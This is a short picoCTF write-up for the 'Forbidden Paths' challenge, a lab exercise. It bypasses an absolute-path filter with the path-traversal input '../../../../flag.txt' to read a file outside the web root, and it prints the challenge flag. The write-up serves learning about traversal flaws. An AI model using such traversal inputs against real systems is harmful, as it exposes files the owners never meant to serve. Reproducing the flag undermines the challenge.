## Forbidden Paths

### Challenge description:

```
Can you get the flag?
We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?
Additional details will be available after launching your challenge instance.
```

### Steps to solve:
* On launching the challenge instance, the website URL obtained was:
```
http://saturn.picoctf.net:50914/read.php
```

* Since the prompt states that the reader does not accept absolute paths, we navigate to the root directory by 4 steps, based on the path provided in the prompt. 

* Thus the final command typed into the search box is:
```
../../../../flag.txt
```

* On clicking ```Read```, the following flag is displayed:
```
picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}
```

